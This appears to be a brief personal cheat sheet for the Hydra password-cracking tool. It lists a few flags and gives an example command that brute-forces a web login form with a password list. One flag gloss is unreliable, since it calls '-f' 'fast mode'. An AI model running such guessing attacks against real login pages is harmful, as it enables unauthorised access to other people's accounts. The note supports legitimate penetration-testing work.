# Hydra
- -t 4: numbers of task
- -f: fast mode
- -s 2222: specify port
## Example
```bash
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
